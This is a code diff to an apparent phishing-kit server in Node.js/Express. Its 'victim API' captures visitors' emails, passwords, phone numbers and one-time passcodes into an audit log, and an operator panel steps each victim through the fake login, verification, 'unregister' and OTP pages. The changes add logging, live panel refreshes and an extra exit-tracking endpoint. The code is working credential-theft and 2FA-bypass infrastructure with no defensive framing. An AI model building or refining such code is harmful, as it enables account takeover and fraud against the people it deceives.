@@ -116,6 +116,7 @@ function cleanupSession(sid, reason, silent = false) {
   if (!v) return;
   sessionsMap.delete(sid);
   sessionActivity.delete(sid);
+  console.log(`[CLEANUP] ${sid} - ${reason}`);
 }
 
 /* ----------  VICTIM API  ---------- */
@@ -135,12 +136,13 @@ app.post('/api/session', async (req, res) => {
       platform: uaParser(ua).os?.name || 'n/a',
       browser: uaParser(ua).browser?.name || 'n/a',
       attempt: 0, totalAttempts: 0, otpAttempt: 0, unregisterClicked: false,
-      status: 'loaded', victimNum: victimCounter,
+      status: 'wait', victimNum: victimCounter,  // Changed to 'wait' so buttons show immediately
       interactions: [],
       activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to page' }]
     };
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
+    console.log(`[NEW SESSION] ${sid} - Victim #${victimCounter}`);
     res.json({ sid });
   } catch (err) {
     console.error('Session creation error', err);
@@ -163,14 +165,21 @@ app.post('/api/login', async (req, res) => {
     if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-    v.entered = true; v.email = email; v.password = password;
-    v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
+    v.entered = true; 
+    v.email = email; 
+    v.password = password;
+    v.status = 'wait'; 
+    v.attempt += 1; 
+    v.totalAttempts += 1;
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
 
     auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
+    
+    console.log(`[LOGIN] ${sid} - Client: ${email}`);
+    emitPanelUpdate(); // Force panel refresh
     res.sendStatus(200);
   } catch (err) {
     console.error('Login error', err);
@@ -184,7 +193,8 @@ app.post('/api/verify', async (req, res) => {
     if (!phone?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-    v.phone = phone; v.status = 'wait';
+    v.phone = phone; 
+    v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
@@ -192,6 +202,9 @@ app.post('/api/verify', async (req, res) => {
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
+    
+    console.log(`[VERIFY] ${sid} - Phone: ${phone}`);
+    emitPanelUpdate();
     res.sendStatus(200);
   } catch (e) {
     console.error('Verify error', e);
@@ -204,12 +217,15 @@ app.post('/api/unregister', async (req, res) => {
     const { sid } = req.body;
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-    v.unregisterClicked = true; v.status = 'wait';
+    v.unregisterClicked = true; 
+    v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Victim proceeded to unregister page' });
 
+    console.log(`[UNREGISTER] ${sid}`);
+    emitPanelUpdate();
     res.sendStatus(200);
   } catch (err) {
     console.error('Unregister error', err);
@@ -223,7 +239,8 @@ app.post('/api/otp', async (req, res) => {
     if (!otp?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-    v.otp = otp; v.status = 'wait';
+    v.otp = otp; 
+    v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
@@ -231,6 +248,9 @@ app.post('/api/otp', async (req, res) => {
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.otp = otp;
+    
+    console.log(`[OTP] ${sid} - OTP entered`);
+    emitPanelUpdate();
     res.sendStatus(200);
   } catch (err) {
     console.error('OTP error', err);
@@ -250,6 +270,8 @@ app.post('/api/page', async (req, res) => {
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
 
+    console.log(`[PAGE] ${sid} - ${oldPage} → ${page}`);
+    emitPanelUpdate();
     res.sendStatus(200);
   } catch (err) {
     console.error('Page change error', err);
@@ -257,27 +279,40 @@ app.post('/api/page', async (req, res) => {
   }
 });
 
-// Handle tab close / page exit - immediately delete session
+// Handle tab close / page exit
 app.post('/api/exit', async (req, res) => {
   const { sid } = req.body;
+  console.log(`[EXIT] Received for ${sid}`);
   if (sid && sessionsMap.has(sid)) {
-    cleanupSession(sid, 'closed the page', true);
+    cleanupSession(sid, 'closed the page');
     emitPanelUpdate();
   }
   res.sendStatus(200);
 });
 
-// NEW: Beacon endpoint for beforeunload (sendBeacon needs text/plain usually)
+// Beacon endpoint for beforeunload
 app.post('/api/beacon/exit', express.text(), (req, res) => {
   try {
     const data = JSON.parse(req.body);
     const { sid } = data;
+    console.log(`[BEACON EXIT] Received for ${sid}`);
     if (sid && sessionsMap.has(sid)) {
-      cleanupSession(sid, 'closed the page (beacon)', true);
+      cleanupSession(sid, 'closed the page (beacon)');
       emitPanelUpdate();
     }
   } catch (e) {
     console.error('Beacon exit error', e);
+  }
+  res.sendStatus(200);
+});
+
+// GET endpoint for exit (for img src fallback)
+app.get('/api/exit', (req, res) => {
+  const { sid } = req.query;
+  console.log(`[GET EXIT] Received for ${sid}`);
+  if (sid && sessionsMap.has(sid)) {
+    cleanupSession(sid, 'closed the page (img)');
+    emitPanelUpdate();
   }
   res.sendStatus(200);
 });
@@ -341,7 +376,6 @@ function buildPanelPayload() {
 app.get('/api/panel', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
-  // long-poll: wait up to 1 s for an event
   const listener = () => res.json(buildPanelPayload());
   events.once('panel', listener);
   setTimeout(() => {
@@ -366,6 +400,7 @@ app.post('/api/panel', async (req, res) => {
       } else if (v.page === 'otp.html') {
         v.status = 'redo'; v.otp = ''; v.otpAttempt++;
       }
+      console.log(`[REDO] ${sid} on ${v.page}`);
       break;
     case 'cont':
       v.status = 'ok';
@@ -373,6 +408,7 @@ app.post('/api/panel', async (req, res) => {
       else if (v.page === 'verify.html') v.page = 'unregister.html';
       else if (v.page === 'unregister.html') v.page = 'otp.html';
       else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
+      console.log(`[CONTINUE] ${sid} → ${v.page}`);
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
